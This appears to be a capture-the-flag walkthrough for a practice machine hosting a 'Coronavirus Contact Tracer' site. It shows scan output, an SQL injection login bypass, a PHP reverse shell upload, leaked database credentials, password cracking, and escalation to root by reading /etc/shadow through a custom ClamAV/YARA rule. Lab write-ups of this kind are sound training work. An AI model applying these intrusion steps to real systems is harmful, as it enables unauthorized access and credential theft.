@@ -1,0 +1,153 @@
+ip address:10.10.197.62
+
+Nmap:
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA1Xdw3dCrCjetmQieza7pYcBp1ceBvVB6g1A/OU+bqoRSEfnKTHP0k5P2U1BbeciJTqflslP3IHh+py4jkWTkzbU80Mxokn2Kr5Qa5GKgrme4Q6GfQsQeeFpbLlIHs+eEBnCLY/J03iddkt6eukd3VwZuRXHnEHl7G6Y1f0IEEzProg15iAtUTbS8OwPx+ZwdvXfJTWujUS+OzLLjQw5wPewCEK+TJHVM02H+5sO+dYBMC9rgiEnPe5ayP+nupAXMNYB9/p/gO3nj5h33SokY3RkXMFsijUJpoBnsDHNgo2Q41j9AB4txabzUQVFql30WO8l8azO4y/fWYYtU8YCn
+|   256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjTYytQsU83icaN6V9H1Kotl0nKVpR35o6PtyrWy9WjljhWaNr3cnGDUnd7RSIUOiZco3UL5+YC31sBdVy6b6o=
+|   256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHVz0M8zYIXcw2caiAlNCr01ycEatz/QPx1PpgMZqZN
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Coronavirus Contact Tracer
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Gobuster:
+
+/uploads (Status: 301)
+/admin (Status: 301)
+/plugins (Status: 301)
+/classes (Status: 301)
+/temp (Status: 301)
+/dist (Status: 301)
+/inc (Status: 301)
+/build (Status: 301)
+/libs (Status: 301)
+
+
+SQL injection on login page:
+ ’ or 1=1-- -; 
+
+upload a php reverse shell using /admin/?page=system_info, and then log out and reach  http://contacttracer.thm
+
+once you get a reverse shell enumerate to get the user. in thise case take a look into /var/www/config.php. There is no creds here but there is an interesting file /classes/DBConnection.php. Cat the file and get the db pass:
+user: cts
+database_pass: YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE
+
+Now use mysql in order to read the db:
+mysql -u cts -p
+show databases;
+use cts_db;
+show tables;
+select * from users;
+
+found password hash for cyrus: 3eba6f73c19818c36ba8fea761a3ce6d 
+=->sweetpandemonium
+
+switch to cyrus user and get user.txt
+
+$su -cyrus
+$cat /home/cyrus/user.txt
+
+cat /etc/passwd to get other users:
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+maxine:x:1000:1000:maxine:/home/maxine:/bin/bash
+cyrus:x:1001:1001::/home/cyrus:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+clamav:x:112:114::/var/lib/clamav:/bin/false
+
+try to escalate privilege: run sudo -l:
+
+user can run the following commangs: /opt/scan/scan.sh
+
+cat /opt/scan/scan.sh
+
+Clasmscan or ClamAV uses yara rules. Try to set a new custom rule in order to read /etc/shadow
+
+cat /etc/clamav/freshclam.conf
+
+go to /var/lib/clamav
+
+check the privileges for this folder: ls -la /var/lib/clamav
+we can write and read to this folder
+
+remove the default rule: rm main.hdb
+
+create a new yara rule in this folder:
+touch rule.yara
+nano rule.yara
+add the following : 
+rule test 
+{
+  strings:
+    $show = "root"
+  condition:
+    $show
+}
+
+run the scan.sh script on /etc/shadow
+
+$ sudo /opt/scan/scan.sh
+/etc/shadow
+
+copy the hash of maxine to a file :axine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
+
+use john to get the pass: 
+$ john --wordlis=rockyou.txt hash
+
+got the password for maxine: tiarna 
+
+switch to maxine user: su -maxine
+
+run sudo -l
+User maxine may run the following commands on lockdown:
+    (ALL : ALL) ALL
+
+    sudo -u root bash -p
+
+    got root access
+cat /root/root.txt
+
+
